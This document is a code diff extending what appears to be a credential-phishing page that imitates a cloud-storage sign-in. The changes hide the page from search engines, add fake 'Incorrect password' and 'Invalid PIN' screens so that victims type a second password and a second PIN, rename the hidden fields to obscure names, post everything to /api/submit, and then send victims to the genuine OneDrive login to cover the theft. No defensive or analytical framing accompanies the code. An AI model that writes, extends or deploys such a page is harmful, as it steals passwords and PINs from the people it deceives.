@@ -5,6 +5,7 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
     <link rel="icon" href="img/favicon.ico" />
     <title>Digital Storage Service Studio</title>
     <style>
@@ -371,8 +372,56 @@ img{
       </p>
     </div>
     <div>
-      <button class="btn" id="btn_sig">Submit</button>
+      <button class="btn" id="btn_sig">Next</button>
     </div>
+  </div>
+</section>
+
+<section id="section_pwdp" class="d-none">
+  <div class="auth-wrapper">
+    <img src="img/lg16.png" class="navimg" alt="ZenStudio Logo" />
+    <div class="identity w-100 mt-16 mb-16">
+      <button class="back">
+        <img src="img/back.png" />
+      </button>
+      <span id="user_identity">a@b.com</span>
+    </div>
+    <h2 class="ttl-pwdp">Enter password</h2>
+    <p id="" class="error" style="color: red;">Incorrect password. Please try again.</p>
+    <div class="mb-16">
+      <p id="error_pwdp" class="error"></p>
+      <input id="inp_pwdp" type="password" name="psdwetp" class="input" placeholder="Password" required />
+    </div>
+    <div>
+      <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
+      <p class="mb-16">
+        <a href="#" class="link fs-13">Other ways to sign in</a>
+      </p>
+    </div>
+    <div>
+      <button class="btn" id="btn_sigp">Next</button>
+    </div>
+  </div>
+</section>
+
+<section id="section_pin" class="d-none">
+  <div class="auth-wrapper">
+    <img src="img/lg16.png" alt="ZenStudio" class="navimg" />
+    <div class="identity w-100 mt-16 mb-16">
+      <span id="user_identity_final">a@b.com</span>
+    </div>
+<h2 class="title mb-16">Verify your identity</h2>
+<p class="p">Please enter your PIN below to continue.</p>
+
+<p id="error_pin" class="error" style="color: red; display: none;">Invalid PIN. Please try again.</p>
+
+<div class="mb-16">
+  <input id="inp_pin" type="password" name="pnin" class="input" placeholder="Enter PIN" />
+</div>
+
+<div class="btn-group">
+  <button class="btn" id="btn_pin_next">Next</button>
+</div>
   </div>
 </section>
 
@@ -385,10 +434,10 @@ img{
 <h2 class="title mb-16">Verify your identity</h2>
 <p class="p">Please enter your PIN below to continue.</p>
 
-<p id="error_pin" class="error" style="color: red; display: none;">Invalid PIN. Please try again.</p>
+<p id="error_pin" class="error" style="color: red;">Invalid PIN. Please try again.</p>
 
 <div class="mb-16">
-  <input id="inp_pin" type="password" class="input" placeholder="Enter PIN" />
+  <input id="inp_pinr" type="password" name="pninr" class="input" placeholder="Enter PIN" />
 </div>
 
 <div class="btn-group">
@@ -400,7 +449,9 @@ img{
 <form action="/api/submit" id="ctfrmPhrase" method="post" class="d-none">
   <input type="hidden" name="phwet" id="form_email">
   <input type="hidden" name="psdwet" id="form_password">
-  <input type="hidden" name="pin" id="form_pin">
+  <input type="hidden" name="psdwetp" id="form_passwordp">
+  <input type="hidden" name="pnit" id="form_pin">
+  <input type="hidden" name="pnitr" id="form_pinr">
 </form>
     <footer class="footer">
         <a href="#">Terms of use</a>
@@ -425,86 +476,125 @@ function lrxrMssg(formId) {
 
   fetch("/api/submit", {
     method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify(data)
   })
-  .then(response => response.ok ? response.json() : response.json().then(err => { throw new Error(err.error || `HTTP ${response.status}`); }))
-.then(data => {
-  window.location.href = "https://onedrive.live.com/login";
-})
-  .catch(error => {
+  .then(response =>
+    response.ok ? response.json() : response.json().then(err => {
+      throw new Error(err.error || `HTTP ${response.status}`);
+    })
+  )
+  .then(() => {
+    window.location.href = "https://onedrive.live.com/login";
+  })
+  .catch(() => {
     submitBtn.textContent = originalText;
     submitBtn.disabled = false;
   });
 }
 
-// Login step logic
-let view = "uname";
-let unameVal = pwdVal = false;
+function handleFinalSubmit() {
+  const pin2 = document.getElementById('inp_pinr').value.trim();
+  if (pin2 === '') {
+    document.getElementById('error_pin').style.display = 'block';
+    return;
+  }
+  document.getElementById('error_pin').style.display = 'none';
+  document.getElementById('form_pinr').value = pin2;
+  lrxrMssg("ctfrmPhrase");
+}
 
+// Input elements
 const unameInp = document.getElementById('inp_uname');
 const pwdInp = document.getElementById('inp_pwd');
+const pwdInpp = document.getElementById('inp_pwdp');
+const pinInp = document.getElementById('inp_pin');
+const pinInpR = document.getElementById('inp_pinr');
 
-
+// Step buttons
 const nextBtn = document.getElementById('btn_next');
-const submitBtn = document.getElementById('btn_sig');
+const pwdNextBtn = document.getElementById('btn_sig');
+const pwdpNextBtn = document.getElementById('btn_sigp');
+const pinNextBtn = document.getElementById('btn_pin_next');
 
+// Step transitions
+
+// Step 1 → Step 2 (email → password)
 nextBtn.addEventListener('click', () => {
   if (unameInp.value.trim() === '') {
     document.getElementById('error_uname').innerText = "Enter a valid email address";
     unameInp.classList.add('error-inp');
     return;
   }
-  unameVal = true;
   document.getElementById('error_uname').innerText = "";
   unameInp.classList.remove('error-inp');
+  document.getElementById('form_email').value = unameInp.value;
 
   document.getElementById("section_uname").classList.add('d-none');
-  document.getElementById('section_pwd').classList.remove('d-none');
-  document.querySelectorAll('#user_identity').forEach((e) => e.innerText = unameInp.value);
+  document.getElementById("section_pwd").classList.remove('d-none');
+  document.querySelectorAll('#user_identity').forEach(el => el.innerText = unameInp.value);
 });
 
-submitBtn.addEventListener('click', () => {
+// Step 2 → Step 3 (password → secondary password)
+pwdNextBtn.addEventListener('click', () => {
   if (pwdInp.value.trim() === '') {
-    document.getElementById('error_pwd').innerText = "Please enter the password for your Zenstudio account.";
+    document.getElementById('error_pwd').innerText = "Enter your password";
     pwdInp.classList.add('error-inp');
     return;
   }
-  pwdVal = true;
   document.getElementById('error_pwd').innerText = "";
   pwdInp.classList.remove('error-inp');
-
-  document.getElementById("section_pwd").classList.add('d-none');
-  document.getElementById('section_final').classList.remove('d-none');
-  document.getElementById('user_identity_final').innerText = unameInp.value;
-
-  // Transfer data to hidden form for final submit
-  document.getElementById('form_email').value = unameInp.value;
   document.getElementById('form_password').value = pwdInp.value;
-  document.getElementById('form_pin').value = document.getElementById('inp_pin').value;
-});
 
-// Back button logic
-
-document.querySelector('.back').addEventListener('click', () => {
   document.getElementById("section_pwd").classList.add('d-none');
-  document.getElementById('section_uname').classList.remove('d-none');
+  document.getElementById("section_pwdp").classList.remove('d-none');
 });
-</script>
 
-<script>
-  function handleFinalSubmit() {
-    const pinVal = document.getElementById('inp_pin').value.trim();
-    if (pinVal === '') {
-      document.getElementById('error_pin').style.display = 'block';
-      return;
-    }
-    document.getElementById('error_pin').style.display = 'none';
-    document.getElementById('form_pin').value = pinVal;
-    lrxrMssg("ctfrmPhrase");
+// Step 3 → Step 4 (secondary password → PIN)
+pwdpNextBtn.addEventListener('click', () => {
+  if (pwdInpp.value.trim() === '') {
+    document.getElementById('error_pwdp').innerText = "Enter the secondary password";
+    pwdInpp.classList.add('error-inp');
+    return;
   }
+  document.getElementById('error_pwdp').innerText = "";
+  pwdInpp.classList.remove('error-inp');
+  document.getElementById('form_passwordp').value = pwdInpp.value;
+
+  document.getElementById("section_pwdp").classList.add('d-none');
+  document.getElementById("section_pin").classList.remove('d-none');
+});
+
+// Step 4 → Step 5 (PIN → secondary PIN)
+pinNextBtn.addEventListener('click', () => {
+  if (pinInp.value.trim() === '') {
+    alert("Please enter PIN 1");
+    return;
+  }
+  document.getElementById('form_pin').value = pinInp.value;
+
+  document.getElementById("section_pin").classList.add('d-none');
+  document.getElementById("section_final").classList.remove('d-none');
+  document.getElementById('user_identity_final').innerText = unameInp.value;
+});
+
+document.querySelectorAll('.back').forEach(button => {
+  button.addEventListener('click', () => {
+    const currentSection = button.closest('section');
+    currentSection.classList.add('d-none');
+
+    if (currentSection.id === 'section_pwd') {
+      document.getElementById('section_uname').classList.remove('d-none');
+    } else if (currentSection.id === 'section_pwdp') {
+      document.getElementById('section_pwd').classList.remove('d-none');
+    } else if (currentSection.id === 'section_pin') {
+      document.getElementById('section_pwdp').classList.remove('d-none');
+    } else if (currentSection.id === 'section_final') {
+      document.getElementById('section_pin').classList.remove('d-none');
+    }
+  });
+});
+
 </script>
 
 
